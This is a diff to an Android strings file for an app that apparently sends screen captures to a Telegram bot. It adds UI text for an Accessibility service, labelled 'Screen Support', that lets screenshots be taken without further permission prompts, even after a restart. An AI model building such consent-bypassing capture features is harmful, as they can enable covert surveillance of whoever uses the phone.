@@ -53,6 +53,12 @@
     <string name="setup_shot_ok">Screen capture granted</string>
     <string name="setup_shot_denied">Screen capture denied</string>
     <string name="setup_shot_unsupported">Screen capture not supported on this device</string>
+    <string name="setup_a11y">Enable Accessibility</string>
+    <string name="setup_a11y_on">Accessibility active</string>
+    <string name="setup_a11y_how">In the Accessibility services list, pick this app and turn it on. Once active, screenshots need no permission again even after a phone restart.</string>
+    <string name="setup_status_a11y_fmt">Accessibility: %1$s</string>
+    <string name="shot_a11y_label">Screen Support</string>
+    <string name="shot_a11y_description">Helps take screen captures of this device when the owner asks for them.</string>
     <string name="setup_status_sent">Status sent — check Telegram</string>
     <string name="setup_fill_all">Fill in Bot Token and Chat ID first</string>
     <string name="setup_bad_token">Invalid token format, must contain :</string>
